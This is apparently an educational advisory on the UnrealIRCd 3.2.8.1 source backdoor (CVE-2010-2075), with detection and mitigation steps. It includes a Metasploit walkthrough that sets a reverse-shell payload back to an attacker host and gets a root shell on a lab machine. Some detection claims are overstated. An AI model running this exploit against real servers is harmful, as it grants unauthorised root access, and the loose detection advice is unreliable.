The **UnrealIRCd 3.2.8.1 Backdoor** is associated with **CVE-2010-2075**, a well-known vulnerability that was introduced when the source code of the UnrealIRCd software was compromised. Below is detailed information about this backdoor and its associated CVE.

### **CVE ID**:
- **CVE-2010-2075**

### **Vulnerability Description**:
The **UnrealIRCd 3.2.8.1** source tarball was compromised and contained a backdoor. This backdoor allowed remote attackers to execute arbitrary commands on the affected server with the privileges of the user running the UnrealIRCd process (often root or another privileged account). The malicious code was inserted into the UnrealIRCd source code between November 2009 and June 2010, affecting version 3.2.8.1.

### **Backdoor Behavior**:
The backdoor allowed attackers to connect to the affected server and execute shell commands remotely without authentication. This made it extremely dangerous since it provided complete control over the server to anyone who exploited it.

#### Key Details:
- The backdoor was inserted into the official UnrealIRCd source package hosted on the official servers.
- The affected version was **3.2.8.1**, which was downloaded between **November 2009** and **June 2010**.
- The exploit was activated by sending a specially crafted command to the UnrealIRCd server.
- The backdoor allowed **remote code execution (RCE)**, which gave attackers full control over the server.

### **Impact**:
- **Remote Code Execution**: Attackers could remotely execute arbitrary commands with the privileges of the UnrealIRCd process.
- **Full System Compromise**: If the UnrealIRCd process was running as root, the attackers could fully compromise the system.

### **Exploit Details**:
The backdoor in UnrealIRCd 3.2.8.1 was simple in nature and allowed any connected user to send a specific string of data to the IRC server, causing it to execute arbitrary commands on the host system. This made any server running the affected version of UnrealIRCd vulnerable to remote attacks.

```bash
msfconsole
msf> use exploit/unix/irc/unreal_ircd_3281_backdoor
msf exploit(unreal_ircd_3281_backdoor) > show targets
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.0.31
msf exploit(unreal_ircd_3281_backdoor) > set TARGET 0
msf exploit(unreal_ircd_3281_backdoor) > set PAYLOAD cmd/unix/reverse
msf exploit(unreal_ircd_3281_backdoor) > set LHOST 192.168.0.30
msf exploit(unreal_ircd_3281_backdoor) > set LPORT 4444  
msf exploit(unreal_ircd_3281_backdoor) > exploit
sessions -i 2

sessions 2
shell
root@metasploitable:/etc/unreal#
cd /root
root@metasploitable:/root# ls
ls
Desktop  reset_logs.sh  vnc.log
```
### **Affected Versions**:
- **UnrealIRCd 3.2.8.1**

Other versions of UnrealIRCd before and after 3.2.8.1 were not affected because they did not contain the malicious code.

### **Solution**:
The UnrealIRCd development team quickly responded after the discovery of the backdoor by:
- Removing the compromised tarball from their servers.
- Issuing a clean version of UnrealIRCd.
- Advising all users to upgrade to a version newer than 3.2.8.1.

The safest course of action was to immediately upgrade to a newer version, as the developers fixed the issue by removing the backdoor code.

### **How to Detect**:
If you are running UnrealIRCd and want to check whether your server was affected:
1. **Check the version**: If you're using UnrealIRCd 3.2.8.1, your server was compromised.
   ```bash
   /path/to/unrealircd --version
   ```
2. **Check the binary for known backdoor strings**:
   Search for the backdoor in the binary by looking for specific commands known to be associated with the backdoor. For example, you can use the `grep` command to search the binary:
   ```bash
   grep -a "AB;" /path/to/unrealircd
   ```
   If the backdoor is present, this command will return a string associated with the backdoor.

### **Mitigation**:
- **Upgrade UnrealIRCd**: The backdoor was fixed in later versions, so upgrade to a version newer than 3.2.8.1.
- **Reinstall the Operating System**: If your system was compromised, it’s strongly recommended to reinstall the operating system or restore from a known clean backup.
- **Run Security Tools**: Tools like `rkhunter`, `chkrootkit`, and `ClamAV` can be used to scan for malware and other backdoors, but the primary fix is to ensure that the compromised version is no longer in use.

### **References**:
- **CVE Database Entry**: [CVE-2010-2075](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075)
- **Original Advisory from UnrealIRCd**: [UnrealIRCd.org](https://forums.unrealircd.org/viewtopic.php?f=1&t=6568) – This provides detailed information about the backdoor and the recommended upgrade steps.
- **Exploit Database**: The backdoor exploit has been documented in the Exploit Database and is known to allow remote code execution without authentication.

### **Summary**:
- **CVE ID**: CVE-2010-2075
- **Description**: Remote code execution vulnerability due to a backdoor in UnrealIRCd 3.2.8.1.
- **Affected Versions**: UnrealIRCd 3.2.8.1
- **Severity**: High (Remote Code Execution)
- **Impact**: Complete system compromise.
- **Solution**: Upgrade to a later version and ensure you do not run version 3.2.8.1.

This vulnerability is particularly dangerous as it allows attackers full control of the system. If you find the compromised version installed on your system, it’s essential to upgrade and assess the damage caused by the potential exploit.
